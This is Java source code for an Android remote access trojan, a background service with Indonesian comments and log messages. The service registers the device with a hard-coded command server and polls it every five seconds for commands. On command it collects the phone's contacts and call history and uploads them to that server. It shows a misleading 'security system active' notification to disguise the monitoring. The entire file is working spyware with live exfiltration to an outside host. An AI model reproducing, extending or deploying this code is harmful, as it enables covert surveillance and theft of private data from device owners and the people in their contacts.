package com.example.androidrat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class RatService extends Service {

    private static final String TAG = "RatService";
    private static final String BASE_URL = "https://bott-production-2188.up.railway.app";
    private static final String REGISTER_URL = BASE_URL + "/rat/register/android";
    private static final String COMMAND_URL = BASE_URL + "/rat/command";
    private static final String DATA_URL = BASE_URL + "/rat/data";
    private static final String CHANNEL_ID = "RatServiceChannel";
    private static final int POLLING_INTERVAL_MS = 5000; // 5 detik

    private String deviceId;
    private OkHttpClient httpClient;
    private Handler commandHandler;
    private Runnable commandRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .build();
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            Log.e(TAG, "Gagal mendapatkan ID perangkat.", e);
            deviceId = "unknown_device";
        }
        Log.d(TAG, "Service onCreate: Layanan RAT dibuat untuk perangkat: " + deviceId);

        createNotificationChannel();
        registerDevice();

        commandHandler = new Handler(Looper.getMainLooper());
        commandRunnable = this::pollForCommands;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand: Layanan RAT dimulai.");

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Sistem Keamanan Aktif")
                .setContentText("Perangkat Anda sedang dipantau untuk tujuan keamanan.")
                .setSmallIcon(android.R.drawable.ic_dialog_info) // Menggunakan ikon bawaan Android
                .build();

        startForeground(1, notification);
        commandHandler.post(commandRunnable); // Mulai polling

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Saluran Layanan RAT",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private void registerDevice() {
        new Thread(() -> {
            try {
                JSONObject json = new JSONObject();
                json.put("deviceId", deviceId);
                RequestBody body = RequestBody.create(json.toString(), MediaType.get("application/json; charset=utf-8"));
                Request request = new Request.Builder().url(REGISTER_URL).post(body).build();

                httpClient.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        Log.e(TAG, "Gagal mendaftarkan perangkat: ", e);
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        if (response.isSuccessful()) {
                            Log.i(TAG, "Perangkat berhasil didaftarkan.");
                        } else {
                            Log.e(TAG, "Gagal mendaftarkan perangkat. Kode: " + response.code() + " | Pesan: " + response.body().string());
                        }
                        response.close();
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Error saat membuat request pendaftaran.", e);
            }
        }).start();
    }

    private void pollForCommands() {
        String url = COMMAND_URL + "?deviceId=" + deviceId;
        Request request = new Request.Builder().url(url).get().build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Gagal polling perintah: ", e);
                scheduleNextPoll(); // Coba lagi setelah jeda
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    if (response.isSuccessful()) {
                        String responseBody = response.body().string();
                        JSONObject json = new JSONObject(responseBody);
                        String command = json.optString("command", null);
                        if (command != null && !command.isEmpty()) {
                            Log.i(TAG, "Menerima perintah: " + command);
                            handleCommand(command);
                        }
                    } else {
                        Log.e(TAG, "Gagal polling perintah. Kode: " + response.code());
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error memproses respons perintah.", e);
                } finally {
                    response.close();
                    scheduleNextPoll(); // Jadwalkan polling berikutnya
                }
            }
        });
    }

    private void scheduleNextPoll() {
        commandHandler.removeCallbacks(commandRunnable);
        commandHandler.postDelayed(commandRunnable, POLLING_INTERVAL_MS);
    }

    private void handleCommand(String command) {
        switch (command) {
            case "get_contacts":
                getContacts();
                break;
            case "get_call_logs":
                getCallLogs();
                break;
            // Tambahkan case lain untuk perintah lain di sini
            default:
                Log.w(TAG, "Perintah tidak diketahui: " + command);
                break;
        }
    }

    private void sendDataToServer(String dataType, JSONArray data) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("deviceId", deviceId);
                payload.put("dataType", dataType);
                payload.put("data", data);

                RequestBody body = RequestBody.create(payload.toString(), MediaType.get("application/json; charset=utf-8"));
                Request request = new Request.Builder().url(DATA_URL).post(body).build();

                httpClient.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        Log.e(TAG, "Gagal mengirim data tipe: " + dataType, e);
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        if (response.isSuccessful()) {
                            Log.i(TAG, "Data tipe " + dataType + " berhasil dikirim.");
                        } else {
                            Log.e(TAG, "Gagal mengirim data. Kode: " + response.code());
                        }
                        response.close();
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Error saat membuat payload data.", e);
            }
        }).start();
    }

    private void getContacts() {
        new Thread(() -> {
            Log.d(TAG, "Mulai mengambil Kontak...");
            JSONArray contactsArray = new JSONArray();
            ContentResolver contentResolver = getContentResolver();
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            try (Cursor cursor = contentResolver.query(uri, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC")) {
                if (cursor != null && cursor.moveToFirst()) {
                    int nameColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numberColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    while (cursor.moveToNext()) {
                        JSONObject contact = new JSONObject();
                        contact.put("Name", cursor.getString(nameColumn));
                        contact.put("PhoneNumber", cursor.getString(numberColumn));
                        contactsArray.put(contact);
                    }
                    sendDataToServer("contacts", contactsArray);
                } else {
                    Log.d(TAG, "Tidak ada Kontak yang ditemukan.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error saat mengambil Kontak", e);
            }
            Log.d(TAG, "Selesai mengambil Kontak.");
        }).start();
    }

    private void getCallLogs() {
        new Thread(() -> {
            Log.d(TAG, "Mulai mengambil Log Panggilan...");
            JSONArray logsArray = new JSONArray();
            ContentResolver contentResolver = getContentResolver();
            Uri uri = CallLog.Calls.CONTENT_URI;
            try (Cursor cursor = contentResolver.query(uri, null, null, null, CallLog.Calls.DATE + " DESC")) {
                if (cursor != null && cursor.moveToFirst()) {
                    int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);
                    int nameColumn = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

                    while (cursor.moveToNext()) {
                        JSONObject log = new JSONObject();
                        log.put("PhoneNumber", cursor.getString(numberColumn));
                        log.put("CallerName", cursor.getString(nameColumn));
                        log.put("CallDate", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursor.getLong(dateColumn))));
                        log.put("CallDuration", cursor.getString(durationColumn) + "s");

                        String callType;
                        switch (cursor.getInt(typeColumn)) {
                            case CallLog.Calls.INCOMING_TYPE: callType = "INCOMING"; break;
                            case CallLog.Calls.OUTGOING_TYPE: callType = "OUTGOING"; break;
                            case CallLog.Calls.MISSED_TYPE: callType = "MISSED"; break;
                            default: callType = "UNKNOWN";
                        }
                        log.put("CallType", callType);
                        logsArray.put(log);
                    }
                     sendDataToServer("call_logs", logsArray);
                } else {
                    Log.d(TAG, "Tidak ada log panggilan yang ditemukan.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error saat mengambil log panggilan", e);
            }
             Log.d(TAG, "Selesai mengambil Log Panggilan.");
        }).start();
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        commandHandler.removeCallbacks(commandRunnable); // Hentikan polling
        Log.d(TAG, "Service onDestroy: Layanan RAT dihentikan.");
    }
}
